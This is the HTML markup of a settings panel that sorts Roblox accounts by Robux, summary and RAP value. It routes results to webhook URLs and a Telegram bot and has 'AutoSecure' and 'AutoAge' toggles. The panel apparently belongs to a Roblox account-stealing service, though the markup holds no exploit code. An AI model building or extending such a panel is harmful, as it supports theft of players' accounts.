<div
  class="flex flex-col items-center justify-center px-6 py-8 mx-auto lg:py-0"
>
  <div class="space-y-6 bg-black/30 border border-white/10 rounded-lg p-4">
    <h1 class="text-3xl font-bold text-white my-2">Custom Filters</h1>

    <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
      <div>
        <label for="minRobux" class="block text-sm font-medium mb-2"
          >Robux Filter</label
        >
        <div class="flex bg-zinc-800 rounded-lg overflow-hidden">
          <button
            type="button"
            onclick="decrement('minRobux')"
            class="px-4 py-2 hover:bg-zinc-700 transition-colors"
          >
            -
          </button>
          <input
            type="number"
            id="minRobux"
            value="0"
            class="w-full bg-transparent text-center focus:outline-none"
            min="0"
            onchange="validateNumber(this)"
          />
          <button
            type="button"
            onclick="increment('minRobux')"
            class="px-4 py-2 hover:bg-zinc-700 transition-colors"
          >
            +
          </button>
        </div>
      </div>
      <div>
        <label for="minSummary" class="block text-sm font-medium mb-2"
          >Summary Filter</label
        >
        <div class="flex bg-zinc-800 rounded-lg overflow-hidden">
          <button
            type="button"
            onclick="decrement('minSummary')"
            class="px-4 py-2 hover:bg-zinc-700 transition-colors"
          >
            -
          </button>
          <input
            type="number"
            id="minSummary"
            value="0"
            class="w-full bg-transparent text-center focus:outline-none"
            min="0"
            onchange="validateNumber(this)"
          />
          <button
            type="button"
            onclick="increment('minSummary')"
            class="px-4 py-2 hover:bg-zinc-700 transition-colors"
          >
            +
          </button>
        </div>
      </div>
      <div>
        <label for="minRAP" class="block text-sm font-medium mb-2"
          >RAP Filter</label
        >
        <div class="flex bg-zinc-800 rounded-lg overflow-hidden">
          <button
            type="button"
            onclick="decrement('minRAP')"
            class="px-4 py-2 hover:bg-zinc-700 transition-colors"
          >
            -
          </button>
          <input
            type="number"
            id="minRAP"
            value="0"
            class="w-full bg-transparent text-center focus:outline-none"
            min="0"
            onchange="validateNumber(this)"
          />
          <button
            type="button"
            onclick="increment('minRAP')"
            class="px-4 py-2 hover:bg-zinc-700 transition-colors"
          >
            +
          </button>
        </div>
      </div>
    </div>

    <h1 class="text-3xl font-bold text-white my-2">Webhooks</h1>

    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
      <div>
        <label for="TelegramCmd" class="block text-sm font-medium mb-2"
          >Link to Telegram</label
        >
<input
  type="text"
  id="TelegramCmd"
  readonly
  value="https://t.me/KingOfRblxBot?start"
  onclick="copyContent(this.value)"
  class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
/>
      </div>
      <div>
        <label for="webhookDefault" class="block text-sm font-medium mb-2"
          >Default</label
        >
        <input
          type="text"
          id="webhookDefault"
          placeholder="https://..."
          class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
        />
      </div>
      <div>
        <label for="webhookRobux" class="block text-sm font-medium mb-2"
          >Robux</label
        >
        <input
          type="text"
          id="webhookRobux"
          placeholder="https://..."
          class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
        />
      </div>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
      <div>
        <label for="webhookSummary" class="block text-sm font-medium mb-2"
          >Summary</label
        >
        <input
          type="text"
          id="webhookSummary"
          placeholder="https://..."
          class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
        />
      </div>
      <div>
        <label for="webhookRAP" class="block text-sm font-medium mb-2"
          >RAP</label
        >
        <input
          type="text"
          id="webhookRAP"
          placeholder="https://..."
          class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
        />
      </div>
    </div>

    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
      <div>
        <h1 class="text-3xl font-bold text-white my-6">Dashboard</h1>
        <div class="flex">
          <div class="flex items-center me-10">
            <input
              id="dashboardAnonymous"
              type="checkbox"
              value=""
              class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
            />
            <label
              for="inline-checkbox"
              class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300"
              >Anonymous</label
            >
          </div>
          <div class="flex items-center me-10">
            <input
              id="dashboardAutosecure"
              type="checkbox"
              value=""
              class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
            />
            <label
              for="dashboardAutosecure"
              class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300"
              >AutoSecure</label
            >
          </div>
          <div class="flex items-center me-10">
            <input
              id="dashboardAutoAge"
              type="checkbox"
              value=""
              class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
            />
            <label
              for="dashboardAutoAge"
              class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300"
              >AutoAge</label
            >
          </div>
        </div>
      </div>

      <div>
        <h1 class="text-3xl font-bold text-white my-6">Discord</h1>
        <div class="flex">
          <div class="flex items-center me-10">
            <input
              id="embedPingEveryone"
              type="checkbox"
              value=""
              class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
            />
            <label
              for="inline-checkbox"
              class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300"
              >@everyone</label
            >
          </div>
          <div class="flex items-center me-10">
            <input
              id="embedPingHere"
              type="checkbox"
              value=""
              class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
            />
            <label
              for="embedPingHere"
              class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300"
              >@here</label
            >
          </div>
          <div class="flex items-center me-10">
            <input
              id="embedVisitNoti"
              type="checkbox"
              value=""
              class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600"
            />
            <label
              for="embedVisitNoti"
              class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300"
              >VisitNotifier</label
            >
          </div>
        </div>

      </div>
    </div>

    <h1 class="text-3xl font-bold text-white my-6">Custom Game</h1>
    <div>
      <input
        type="text"
        id="customGameLink"
        placeholder="8737899170, 920587237, 142823291"
        class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
      />
    </div>

    <button
      id="submit"
      class="w-full bg-indigo-500 hover:bg-indigo-400 text-white font-medium py-2 px-4 rounded-lg transition duration-200 mt-10"
    >
      Save Changes
    </button>
  </div>
</div>
